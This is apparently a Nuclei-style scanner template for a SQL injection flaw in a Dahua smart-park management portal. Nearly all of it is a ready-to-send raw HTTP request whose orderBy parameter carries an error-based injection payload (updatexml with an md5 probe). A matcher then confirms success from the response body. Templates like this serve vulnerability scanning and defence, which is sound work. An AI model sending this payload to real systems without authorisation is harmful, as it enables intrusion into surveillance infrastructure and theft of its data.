id: WPMS-sqli
info:
  author: Str1am
  name: "\u5927\u534E\u667A\u6167\u56ED\u533Asql\u6CE8\u5165\u6F0F\u6D1E"
  severity: high
  tags: dahua
requests:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - 6412121cbb2dc2cb9e460cfee7046be
  matchers-condition: and
  raw:
  - 'GET /portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B"orderBy":"1%20and%201=updatexml(1,concat(0x7e,(select%20md5(10086)),0x7e),1)--"%7D/extend/%7B%7D
    HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
    like Gecko) Chrome/76.0.3809.132 Safari/537.36

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3

    Accept-Encoding:gzip,deflate

    Content-Length: 3

    Accept-Language: zh-CN,zh;q=0.9

    Connection: close

    '
